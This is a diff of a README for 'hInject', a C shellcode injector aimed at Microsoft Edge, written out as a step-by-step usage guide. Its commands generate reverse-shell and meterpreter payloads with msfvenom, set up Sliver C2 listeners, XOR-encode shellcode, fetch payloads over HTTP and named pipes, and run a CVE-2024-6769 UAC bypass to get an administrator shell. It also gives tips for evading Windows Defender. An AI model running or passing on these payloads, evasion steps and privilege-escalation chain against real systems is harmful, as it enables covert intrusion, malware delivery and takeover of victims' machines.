@@ -1,169 +1,214 @@
-**hInject** is a shellcode injector that injects payloads into Microsoft Edge.  
-It is written in C language and not really intended to bypass AV solutions, but it has some workarounds such as hiding Some Windows APIs from the IAT using API hashing tactics.  
+# hInject
 
-It includes several methods for shellcode delivery, such as:  
-- **Embedded resources**: the shellcode is included in the `.rsc` section of the binary.  
-- **Local named pipe**: the server includes the shellcode that **hInject** will grab from a hardcoded named pipe. I added this in case you wanna grape a shell code from a running  beacon or something that created the named pipe for you acting like an intern beacon communication  via named pipes.
-- **HTTP method**: fetches the shellcode from a remote HTTP server.  
-- **HEX**:  pull the shellcode as hex from the stdin doesn't work with UAC bypass i.e `--elevate` cause donut shellcode for UAC bypass is too big to pass in stdin.  
+**hInject** is a shellcode injector written in C, designed to inject payloads into Microsoft Edge. It is not primarily intended to bypass antivirus (AV) solutions but includes workarounds like hiding Windows APIs in the Import Address Table (IAT) using API hashing tactics.
 
-**hInject** also has a UAC bypass implementation of **CVE-2024-6769** from [fortra/CVE-2024-6769][https://github.com/fortra/CVE-2024-6769].  
-It was a pain to re-implement, but I included the DLL that I created as a resource in the repo. Using [**Donut**][https://github.com/TheWover/donut], I converted the UAC bypass into position-independent shellcode and included it as a resource. It will be triggered using `--elevate`. Of course, your DLLs will be pulled from your remote server. It does not always work, but give it a chance — you might get local admin access.  
+## Features
 
-#### Around AV Advices
-**hInject** is very easy to modify and understand. You can remove anything that doesn’t fit your needs:  
--  Remove the HTTP method if you plan to use only resource-based payloads .  
-- If you don’t need resources, just remove them and comment out the corresponding code to make it harder to inspect.  
-- You can also remove the UAC bypass resource and pull it from a remote HTTP server using the HTTP method if you want to minimize entropy and the size of the `.rsc` section (since Defender might detect it because of that).  
+**hInject** supports multiple shellcode delivery methods:
+- **Embedded Resources**: Shellcode is embedded in the `.rsc` section of the binary.
+- **Local Named Pipe**: Retrieves shellcode from a hardcoded named pipe, useful for scenarios like inter-beacon communication (e.g., grabbing shellcode from a running beacon).
+- **HTTP Method**: Fetches shellcode from a remote HTTP server.
+- **HEX**: Reads shellcode as hex from stdin. Note: This method does not work with the `--elevate` flag for UAC bypass due to the large size of Donut-generated shellcode.
 
- it actually performed well against Windows Defender in a Windows 11 VM with Defender enabled, as shown in the demos.  
+## UAC Bypass
 
-Feel free to extend it with other custom methods. Next time, I will implement a native API shellcode injector — but this one is a good beginning, I guess.  
+**hInject** includes a UAC bypass implementation for **CVE-2024-6769**, based on [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769). The bypass is converted into position-independent shellcode using [Donut](https://github.com/TheWover/donut) It can be triggered with the `--elevate` flag. The required DLLs & trigger shellcode can be pulled from a remote server. Note that the bypass is not guaranteed to work and may require administrative privileges in some cases.
 
-Testing environment: a Windows 11 with Microsoft Defender enabled
+For details, see the [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769) repository.
+
+## Anti-Virus Evasion Tips
+
+**hInject** is designed to be modular and easy to modify:
+- **Remove Unneeded Features**: Strip out the HTTP method if using only resource-based payloads to reduce detectability.
+- **Minimize Resources**: Comment out resource-related code to reduce the `.rsc` section size and entropy, which may help evade Windows Defender.
+- **Remote UAC Bypass**: Remove the embedded UAC bypass resource and pull it from an HTTP server to further minimize entropy.
+
+In testing, **hInject** performed well against Windows Defender on a Windows 11 VM with Defender enabled, as shown in the demos below.
+
+## Testing Environment
+
+The tests were conducted on a Windows 11 VM with Microsoft Defender enabled.
+
+### System Information
 ```powershell
 systeminfo | findstr /B /C:"Host Name" /C:"Os Name" /C:"Os Version"
 ```
-![[Pasted image 20250829230114.png]]
-defender features status
+<img width="869" height="88" alt="Pasted image 20250829230114" src="https://github.com/user-attachments/assets/eca41c15-91df-4461-912d-d08b2bfc260d" />
+
+
+### Defender Features Status
 ```powershell
 Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, NISEnabled
 ```
-![[Pasted image 20250829230615.png]]
+<img width="1862" height="205" alt="Pasted image 20250829230528" src="https://github.com/user-attachments/assets/435c70ce-e101-4cba-886f-3161b0bbcdcb" />
 
-i compiled the **hInject** as it is  in the repo with defender will upload files to the cloud for 10s but no thread is detected so we passed some static first checks we can use `rasta mouse` tool too for thread detection to see is there any bad bytes that might trigger static detection (in my main windows 11 host). & there is no dad byte or something triggerd
-![[Pasted image 20250830011113.png]]
 
-we can take a look at the IAT in [**pestudio**][https://www.winitor.com/download]  too 
-![[Pasted image 20250829231743.png]]
-The 17 observed flags are related only to `wininet.dll` and `WS2_32.dll` APIs, since these were not hashed. Loading `wininet.dll` is solely for proxying socket calls; implementing Windows sockets directly would conflict with predefined Windows header structures. A simple header implementation for future use can be found here: [**winnet-sockets**][https://gist.github.com/Abdelhadi963/ee38afefc04ace04be76839357dcabde].
+### Static Analysis
+The compiled **hInject** binary passed initial static checks by Windows Defender in a Windows 11 VM. Defender uploads files to the cloud for 10 seconds, but no threats were detected. Using `rasta-mouse`'s [ThreatCheck tool](https://github.com/rasta-mouse/ThreatCheck), no bad bytes triggered static detection.
+<img width="1561" height="91" alt="Pasted image 20250830011113" src="https://github.com/user-attachments/assets/1c1738ae-ed91-4562-9c7c-84dad0ea40e1" />
 
-There is no `CreateRemoteThread`, `VirtualAlloc`, or `WriteProcessMemory` in the IAT. Functions like `GetCurrentThreadId` and `GetCurrentProcessId` are linked by the C linker and are used only for handling C logic to locate the entry point — they are not actual flags. To eliminate these flags entirely, remove the HTTP method and inject shellcode directly from the embedded resource & just change **inject.c** to the following [inject.c][https://gist.github.com/Abdelhadi963/16a51e4d938269b6ae271a0ce834fe45] & the **parser.h** to [parser.h][https://gist.github.com/Abdelhadi963/5561a581788a29e460c63bab884efa1a] and rebuild the solution.
 
-![[Pasted image 20250829235744.png]]
+IAT analysis with [PEStudio](https://www.winitor.com/download) shows 17 flags related to `wininet.dll` and `WS2_32.dll`, as these APIs were not hashed. The `wininet.dll` is used for proxying socket calls so i found it hard to hash each API name and parse it manualy from a specific DLL cause they linked from diffrent places & when ever i tried this approch i got some confusion with old socket structures includes in standard windows header. I was able to create kinda custom socket implementation i created, see [winnet-sockets](https://gist.github.com/Abdelhadi963/ee38afefc04ace04be76839357dcabde) but i didn't got much time to use it in the injector might be for the next injector.
 
-we can see there is just that 3 default flag cause by default linker and the code still has named pipe ,hex and resource based shellcode injection abilities
+<img width="1612" height="607" alt="Pasted image 20250829231743" src="https://github.com/user-attachments/assets/e3f6d24b-900d-4470-9d19-e6f23f830d98" />
 
-let's test this methods now later i will recompile it with http support and we will test elevation too
 
-**help menu** :
-![[Pasted image 20250830001234.png]]
+No critical APIs like `CreateRemoteThread`, `VirtualAlloc`, or `WriteProcessMemory` appear in the IAT. Functions like `GetCurrentThreadId` and `GetCurrentProcessId` are included by the C linker for some internal functions, not injection. To eliminate these flags, remove the HTTP method and modify `inject.c` and `parser.h` as shown here:
+- [inject.c](https://gist.github.com/Abdelhadi963/16a51e4d938269b6ae271a0ce834fe45)
+- [parser.h](https://gist.github.com/Abdelhadi963/5561a581788a29e460c63bab884efa1a)
 
-> [!NOTE]
-> note : default method i using an embedded resource  easy way to do it as follow works for boot http less & with http 
+After rebuilding, only three default flags remain, and the binary retains named pipe, hex, and resource-based injection capabilities.
 
-**resource method**
-generate shellcode using `msfvenom`
+<img width="1417" height="764" alt="Pasted image 20250829235744" src="https://github.com/user-attachments/assets/1c87356b-f684-4b3c-928b-212acfbd6f90" />
+
+
+## Usage and Testing
+
+Below are examples of using each injection method. The help menu is shown here:
+
+<img width="1423" height="699" alt="Pasted image 20250830001234" src="https://github.com/user-attachments/assets/85c6f021-19cb-46b0-9e7f-576338ee9314" />
+
+
+> **Note**: The default method uses embedded resources. The process works for both HTTP-less and HTTP-enabled versions.
+
+### Resource Method
+
+1. Generate shellcode using `msfvenom`:
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.136.181 LPORT=443 -f raw -o shellcode.bin
 ```
 
-encode it am using  `parser_tool.py` using hardcoded XOR key you can change it or the encryption method as your needs
+2. Encrypt the shellcode using `parser_tool.py` from sources folder with a hardcoded XOR key (modify as needed):
 ```bash
 python parser_tool.py --file shellcode.bin --xor-key ippyokai --binout coffe.bin
 ```
-![[Pasted image 20250830010524.png]]
+<img width="1224" height="97" alt="Pasted image 20250830010524" src="https://github.com/user-attachments/assets/2adc1e59-fdab-4d2a-99c1-6bd9be2bd86a" />
 
-you know how to embed a resource right :) 
-![[Pasted image 20250830001732.png]]
+3. Embed the shellcode as a resource:
+   - In Visual Studio, import the encrypted file (`coffe.bin`) as a resource named `COFFE` (or update `core.h`, `resource.h`, and `hInject.rc` if using a different name).
+   - Rebuild the solution.
 
-Import your file select all extensions in order to see your  shellcode file then give it a name use the same name in the `core.h` if you don't wanna change every things just name `COFFE` as i did & rebuild the solution.
-![[Pasted image 20250830002230.png]]
+<img width="968" height="662" alt="Pasted image 20250830001732" src="https://github.com/user-attachments/assets/14348175-4b3d-4561-9ba1-d75aba9c30fa" />
+<img width="933" height="617" alt="Pasted image 20250830002230" src="https://github.com/user-attachments/assets/0682d835-df2e-4bce-b594-f0e112d15a38" />
 
-running resource method i just renamed **hInject** http less version to that name to presist accross the future rebuild
-```
+4. Run the resource method:
+```bash
 .\hInject.exe -m resource
 ```
-![[Pasted image 20250830012038.png]]
-we got a shell in **commando VM**
-![[Pasted image 20250830012112.png]]
+<img width="1110" height="472" alt="Pasted image 20250830012038" src="https://github.com/user-attachments/assets/25f3ca2a-6c19-48b5-ab69-7ba312d7b903" />
 
-**hex method**
-in this part i will test to  use  **meterpreter** shellcode as a staged payload for **sliver C2**
-```
+The reverse shell was successfully obtained in a Commando VM:
+<img width="959" height="239" alt="Pasted image 20250830012112" src="https://github.com/user-attachments/assets/61f1bbb0-1fd5-4743-a564-36fe261fc62a" />
+
+
+### HEX Method
+
+This example uses a Meterpreter shellcode as a staged payload for Sliver C2.
+
+1. Generate shellcode:
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.138 LPORT=4444 -f raw -o shellcode.bin
 ```
-An easy setup for sliver 
+
+2. Set up Sliver:
 ```bash
 profiles new beacon --mtls 192.168.136.138:4444 --format shellcode hInject
 stage-listener -u tcp://192.168.136.138:4444 -p hInject
 mtls -L 192.168.136.128 -l 443
 ```
-first we need to generate the hex payload from shellcode using `parser_help.py` as follow
+
+3. Convert shellcode to hex using `parser_tool.py`:
 ```bash
 python3 parser_tool.py --file shellcode.bin --xor-key ippyokai --hexshellcode
 ```
-![[Pasted image 20250830015601.png]]
+<img width="1841" height="227" alt="Pasted image 20250830015601" src="https://github.com/user-attachments/assets/cc29642f-12c8-4272-9a8e-df0c3613616c" />
 
+4. Run the HEX method:
+```bash
+.\hInject.exe -m hex <hex_payload>
 ```
-.\hInject -m hex [hex payload]
-```
-![[Pasted image 20250830015709.png]]
-we got the beacon callback then spawned a session and  windows didn't kill any thing
-![[Pasted image 20250830015942.png]]
+<img width="1320" height="477" alt="Pasted image 20250830015709" src="https://github.com/user-attachments/assets/db8ae6a0-2a13-4362-af93-a2983ed1a621" />
 
-**Named pipe method**
-we can do the same serving shellcode using that named pipe server that i included in source code as `PipeServer` project the idea behind it that we can detach the shellcode in another place so that we make our `hInject` clean and server get the shellcode from an named pipe real as a simulation for inter beaconing :)
+The beacon callback was successful, and Windows Defender did not block the process:
+<img width="1462" height="865" alt="Pasted image 20250830015942" src="https://github.com/user-attachments/assets/c3b01061-1678-4be7-b42e-ec0c7dca1dfb" />
 
-using the same shellcode from the previous example we need to generate the C array from it an add it in our `PipeServer` code.
+
+### Named Pipe Method
+
+This method simulates inter-beacon communication by serving shellcode via a named pipe using the included `PipeServer` project.
+
+1. Generate a C array from the shellcode:
 ```bash
 python3 parser_tool.py --file shellcode.bin --xor-key ippyokai --carray --carray-out shellcode.c
 ```
-running the `PipeServer & hInject`
-![[Pasted image 20250830022508.png]]
-Got beacon callback 
-![[Pasted image 20250830022558.png]]
 
-Now back to the full version of `hInject` to test http method & UAC bypass will use a simple tcp reverse shell no need for sliver each time :)
+2. Add the C array to the `PipeServer` project and rebuild.
 
-**http method**
-usage:
+3. Run `PipeServer` and `hInject`:
+<img width="1611" height="468" alt="Pasted image 20250830022508" src="https://github.com/user-attachments/assets/80971569-b310-4f05-b537-efd9b96d3216" />
+
+The beacon callback was successful:
+<img width="1607" height="801" alt="Pasted image 20250830022558" src="https://github.com/user-attachments/assets/5781d520-bd36-40d7-a304-5f4ed5f507fe" />
+
+
+### HTTP Method
+
+This uses the full version of **hInject** with HTTP support.
+
+1. Run the HTTP method:
+```bash
+.\hInject.exe -m http -i 192.168.136.138 -p 80 -f /shellcode.bin
 ```
-.\hInject.exe -m http -i <ip> -p <port> -f </file_name>
-```
-![[Pasted image 20250830024322.png]]
+<img width="1315" height="372" alt="Pasted image 20250830024322" src="https://github.com/user-attachments/assets/5b9abb8f-5769-4c75-8e84-682e26c17c48" />
 
-Got the shell  i used `whoami /priv` to show case that is not elevated 
-![[Pasted image 20250830024203.png]]
+The reverse shell was obtained, running as a non-elevated process (`whoami /priv` confirms):
+<img width="1614" height="838" alt="Pasted image 20250830024203" src="https://github.com/user-attachments/assets/5c24ed1c-0b60-4c4b-b0f2-f6e809550d32" />
 
-**UAC bypass**
 
-> [!NOTE]
-> the down side about this UAC bypass is using ALPC to register that new entry for tapi32 dll in SxS assembly cache and it's can fails. it's soo picky some how some time the bypass it's self needs to run as an admin i didn't find a work around yet but be aware it's might not work at all so feel free to replace it or remove it. however it's works ! for me here.
+### UAC Bypass
 
-Now we can use the `--elevate` flag. We also need to serve the necessary DLLs. For details on how it works, see [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769?utm_source=chatgpt.com). To trigger the UAC bypass, I will generate a shellcode from `uactrigger.exe` using `Donut`.
+> **Note**: The UAC bypass uses ALPC to register a new entry for `tapi32.dll` in the SxS assembly cache, which can be unreliable and may require administrative privileges. If it fails, consider replacing or removing it.
 
-reimplemented the trigger for UAC bypass in the `uactrigger` project for `MsCtfMonitor.dll`. I used the same one from [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769?utm_source=chatgpt.com) sources, but I just patched the message box popup because it’s so tricky to reimplement the activation context request using ALPC and some picky low-level APIs, as explained in the PoC details by `Ricardo Narvaja`. So what you need to modify is just `imm32.dll`. I used my project `uac` to generate the DLL that injects an attached encrypted shellcode into `msedge`. Basically, you just need to change the shellcode attached as a resource.
+The UAC bypass is based on [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769). The `uactrigger.exe` was reimplemented but i used the same`MsCtfMonitor.dll` patched just the message box popup using IDA with nop instructions. The bypass injects a custom `imm32.dll` containing encrypted shellcode into `msedge`.
 
-**elevation steps :)** 
-First we need to use [donut][https://github.com/TheWover/donut] to generate our shellcode from `uactrigger.exe`
+#### Elevation Steps
+
+1. Generate shellcode from `uactrigger.exe` using Donut:
 ```bash
 ./donut -a 2 -f 1 -o daijin.bin -i uactrigger.exe
 ```
-![[Pasted image 20250830030903.png]]
+<img width="994" height="329" alt="Pasted image 20250830030833" src="https://github.com/user-attachments/assets/177df7d7-3117-49aa-983c-fdafbe8e3115" />
 
-encrypt shellcode again
+2. Encrypt the shellcode:
 ```bash
-python3 parser_tool.py -f ~/Desktop/daijin.bin --xor-key ippyokai --binout uac.bin 
+python3 parser_tool.py -f daijin.bin --xor-key ippyokai --binout uac.bin
 ```
 
-As we did before attach it as a resource use `SUZUME` as resource name if you don't wanna change it but change it if you which in `resource.h` and `hInject.rc`  else we will serve our shellcode and payload from a remote http server feel free to test other methods `--reuse` flag is used to use the same http server to serve all the DLLs and the shellcode
+3. Embed the shellcode as a resource named `SUZUME` (or update `resource.h` and `hInject.rc` if using a different name) or serve it from an HTTP server using the `--reuse` flag to reuse the sane http server for the shellcode as i did.
 
-> [!NOTE]
-> NOTE: don't embed a donut shellcode directly is soo big and might defender
+> **Note**: Avoid embedding Donut-generated shellcode directly, as it may increase detectability due to its size and entropy.
 
-second thing that we need to do generate a reverse shell shellcode & attach it as an embedded resource in `uac.c` file inside `uac` project.
+4. Generate and embed a reverse shell shellcode in the `uac.c` file (in the `uac` project) as an embedded resource.
 
-using elevation flag 
+5. Run the UAC bypass:
+```bash
+.\hInject.exe -m http -i 192.168.136.138 -p 80 -f /uac.bin --elevate --reuse --tapi32-manifest TAPI32.Manifest --injector MsCtfMonitor.dll --payload uac.dll
 ```
-.\hInject.exe -m http -i 192.168.136.138 -p 80 -f /uac.bin --elevate --reuse  --tapi32-manifest TAPI32.Manifest --injector MsCtfMonitor.dll --payload uac.dll
-```
-![[Pasted image 20250830075505.png]]
-we can see that **TCMSTUP.exe** pops up, and it is the one that loads `tapi32.dll` → our custom `imm32.dll`. The issue is that if the activation context trick fails, it will instead pull `imm32.dll` from `C:\Windows\System32\`, causing the exploit to fail. 
-However, we can use pexeplorer to check if it loaded our carfted dll from `C:\windows\system32\tasks`
-![[Pasted image 20250830080410.png]]
-in this case we can confirm that we obtained a shell with high integrity level and full administrative privileges.
-![[Pasted image 20250830080510.png]]
+<img width="1699" height="787" alt="Pasted image 20250830075505" src="https://github.com/user-attachments/assets/ba43b187-272b-4581-9c94-1fc3c57799c6" />
 
-for namedpip method is works as the same you need just to provide ip and port for the server from where we will pull neccessary DLLs for the bypass and place donut  trigger shellcode inside namedpipe server.
+The `TCMSTUP.exe` process loads `tapi32.dll`, which in turn loads the custom `imm32.dll`. If the activation context fails, it may load the default `imm32.dll` from `C:\Windows\System32`, causing the exploit to fail. Verify the loaded DLL using Process Explorer:
+
+<img width="1672" height="577" alt="Pasted image 20250830080410" src="https://github.com/user-attachments/assets/baf31098-f746-45d9-be3f-a301b5e15a28" />
+
+A successful bypass results in a shell with high integrity level and full administrative privileges:
+
+<img width="1678" height="960" alt="Pasted image 20250830080510" src="https://github.com/user-attachments/assets/dfbdb799-823f-42dc-9ff2-17aaa5c641e5" />
+
+### Named Pipe Method with UAC Bypass
+
+The named pipe method works similarly. Provide the IP and port of the server hosting the necessary DLLs and place the Donut-generated trigger shellcode in the `PipeServer` project.
+
+## Future Improvements
+
+Future versions of **hInject** may include a native API shellcode injector for enhanced functionality. Contributions and custom delivery methods are welcome!
 
